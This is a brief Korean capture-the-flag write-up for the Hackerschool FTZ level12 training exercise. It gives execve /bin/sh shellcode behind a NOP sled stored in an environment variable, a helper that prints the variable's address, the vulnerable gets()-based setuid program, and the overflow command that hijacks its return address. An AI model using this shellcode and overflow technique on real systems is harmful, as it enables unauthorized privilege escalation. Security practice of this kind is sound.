Hackerschool FTZ level12
===
1. EGG라는 환경변수를 만들고 nop썰매와 bin/sh를 16진수로 바꾼
 > \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80 
 
 를 저장한다
 >export EGG=` python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" '
>>\x90은 nop명령어

 2. 그 EGG의 주소 구함
 ~~~c
#include<stdio.h>
#include<stdlib.h>

int main(int argc, char* argv[]){
        printf("%p\n",getenv(argv[1]));
        return 0;
}
 ~~~

3.attackme에 버퍼오버플로우를 내고 nop썰매 안에 
EGG의 주소넣을 때 문자형으로 함.   

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main( void )
{
        char str[256];

        setreuid( 3093, 3093 );
        printf( "문장을 입력하세요.\n" );
        gets( str );
        printf( "%s\n", str );
}
~~~
>$(python -c 'print "A"*268+"\xfa\xf8\xff\xbf"';cat)|./attackme
>
>my-pass